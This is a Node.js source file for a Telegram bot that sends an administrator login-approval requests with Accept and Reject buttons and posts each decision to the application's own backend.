import TelegramBot from "node-telegram-bot-api";
import fetch from "node-fetch";

const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
const APP_URL = process.env.APP_URL;

if (!BOT_TOKEN || !ADMIN_CHAT_ID || !APP_URL) {
  console.error("Missing BOT_TOKEN, ADMIN_CHAT_ID, or APP_URL in environment");
  process.exit(1);
}

// Initialize bot
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// -----------------
// CB Login approval
// -----------------
export async function sendLoginTelegram(email) {
  const message = `*CB login approval*\n*Email:* ${email}`;
  const options = {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "✅ Accept", callback_data: `accept|${email}` },
          { text: "❌ Reject", callback_data: `reject|${email}` }
        ]
      ]
    }
  };
  await bot.sendMessage(ADMIN_CHAT_ID, message, options);
}

// -----------------
// Handle button clicks
// -----------------
bot.on("callback_query", async (query) => {
  try {
    const [action, email] = query.data.split("|");
    const status = action === "accept" ? "accepted" : "rejected";

    // Update backend
    await fetch(`${APP_URL}/update-status`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email, status })
    });

    await bot.answerCallbackQuery(query.id, { text: `❗️${status.toUpperCase()}❗️` });

    // Update message in Telegram
    await bot.editMessageText(
      `*CB login approval*\n*Email:* ${email}\nStatus: *${status.toUpperCase()}*`,
      {
        chat_id: query.message.chat.id,
        message_id: query.message.message_id,
        parse_mode: "Markdown"
      }
    );

  } catch (err) {
    console.error("❌ Failed to handle callback:", err);
    await bot.sendMessage(ADMIN_CHAT_ID, `⚠️ Error handling approval for ${query.data}`);
  }
});

// /start command
bot.onText(/\/start/, (msg) => {
  bot.sendMessage(msg.chat.id, "✅ Bot is running and waiting for CB login approvals.");
});
